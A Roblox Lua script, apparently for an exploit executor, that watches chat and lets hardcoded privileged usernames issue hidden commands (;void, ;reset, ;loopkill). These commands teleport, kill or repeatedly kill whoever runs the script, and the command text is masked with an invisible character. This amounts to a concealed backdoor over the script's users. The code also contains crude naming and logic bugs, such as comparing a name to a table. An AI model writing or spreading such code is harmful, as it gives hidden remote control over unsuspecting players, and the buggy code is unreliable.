local neb = { 
  "AytoIsNotHard",
  "BWDevsStopKickingMe",
  "NebulaWAREONTOP1pro",
  "poybeans",
}

local priv = {
"ExampleUsername1",
"ExampleUsername2",
}

local StarterGui = game:GetService("StarterGui")
local Notify = function(_Title, _Text , Time)
    StarterGui:SetCore("SendNotification", {Title = _Title, Text = _Text, Icon = "rbxassetid://2541869220", Duration = Time})
end


--THING--
local textChatService = game:GetService("TextChatService")
local chat = Instance.new("TextChannel")
chat.Parent = textChatService.TextChannels
chat.Name = "sex"
local done = false
local StarterGui = game:GetService("StarterGui")
local Notify = function(_Title, _Text , Time)
    StarterGui:SetCore("SendNotification", {Title = _Title, Text = _Text, Icon = "rbxassetid://2541869220", Duration = Time})
end
local cmds = "⭐cmds are: void, cmds, reset, loopkill, unloopkill⭐"
local ores = "⭐ores that can be dropped are:"
local ores2 = "iron,diamond,emerald,gold,u can drop stuff that arnt ores too.⭐"

function GetPlayer(String)
	local plr
	for i, v in pairs(game:GetService("Players"):GetPlayers()) do
		if v.Name:lower():sub(1, #String) == String:lower() then
			plr = v
		end 
	end
	if String == "me" then
		plr = game.Players.LocalPlayer
	end
	if String == "" or String == " " then
		plr = nil
	end
	return plr
end

local NEB = {
  "AytoIsNotHard",
  "BWDevsStopKickingMe"
}
local TextChatService = game:GetService("TextChatService")
local Listening;


Listening = TextChatService.MessageReceived:Connect(function(prompt)
	local speaker = tostring(prompt.TextSource)
	local message = prompt.Text
	local args = message:split(" ")
        local data = prompt.Metadata
	local cmd = args[1]
	local who = args[2]
  local mat = args[3]
  local penis = args[4]
	local target = GetPlayer(who)
	local function getsexter(sexdude)
		local x = false
		for i,v in pairs(priv) do
			if typeof(v) == "string" then
				if v == sexdude then
					x = true
					break
				end
			elseif typeof(v) == "number" then
				if v == sexdude then
					x = true
					break
				end
			end
		end
		return x
	end
	print(speaker)
	print(message)
	print(cmd)
	print(target)
  print(mat)
  print(penis)

               

if cmd == ";void" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer.Name ~= NEB and game.Players.LocalPlayer == target then
prompt.Text = "⁥"
prompt.PrefixText = "⁥"
h = target.Character.HumanoidRootPart
h.CFrame = h.CFrame - Vector3.new(0,1000,0)

elseif cmd == ";void" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." and game.Players.LocalPlayer.Name ~= NEB then
prompt.Text = "⁥"
prompt.PrefixText = "⁥"
h = game.Players.LocalPlayer.Character.HumanoidRootPart
h.CFrame = h.CFrame - Vector3.new(0,1000,0)

elseif cmd == ";cmds" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer.Name ~= NEB and game.Players.LocalPlayer == target then
prompt.Text = "⁥"
prompt.PrefixText = "⁥"
local textChatService = game:GetService("TextChatService")
textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(cmds)
textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("asdasd")

elseif cmd == ";cmds" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." and game.Players.LocalPlayer.Name ~= NEB then
prompt.Text = "⁥"
prompt.PrefixText = "⁥"
local textChatService = game:GetService("TextChatService")
textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(cmds)
textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("asdasd")

elseif cmd == ";reset" and getsexter(speaker) and game.Players.LocalPlayer.Name ~=speaker and game.Players.LocalPlayer == target and game.Players.LocalPlayer.Name ~= NEB then
prompt.Text = "⁥"
prompt.PrefixText = "⁥"
target.Character.Humanoid.Health = 0

elseif cmd == ";reset" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." and game.Players.LocalPlayer.Name ~= NEB then
prompt.Text = "⁥"
prompt.PrefixText = "⁥"
game.Players.LocalPlayer.Character.Humanoid.Health = 0



elseif cmd == ";loopkill" and getsexter(speaker) and game.Players.LocalPlayer.Name ~=speaker and game.Players.LocalPlayer == target and game.Players.LocalPlayer.Name ~= NEB then
game.Players.LocalPlayer.Character.Humanoid.Health = 0
getgenv().loopkill = game.Players.LocalPlayer.CharacterAdded:Connect(function()
wait(0.3)
game.Players.LocalPlayer.Character.Humanoid.Health = 0
end)

elseif cmd == ";unloopkill" and getsexter(speaker) and game.Players.LocalPlayer.Name ~=speaker and game.Players.LocalPlayer == target and game.Players.LocalPlayer.Name ~= NEB then
loopkill:Disconnect()



elseif cmd == ";loopkill" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker   and who == "." and game.Players.LocalPlayer.Name ~= NEB then
game.Players.LocalPlayer.Character.Humanoid.Health = 0
getgenv().loopkill = game.Players.LocalPlayer.CharacterAdded:Connect(function()
wait(0.3)
game.Players.LocalPlayer.Character.Humanoid.Health = 0
end)

elseif cmd == ";unloopkill" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker  and who == "." and game.Players.LocalPlayer.Name ~= NEB then
loopkill:Disconnect()


end
end)
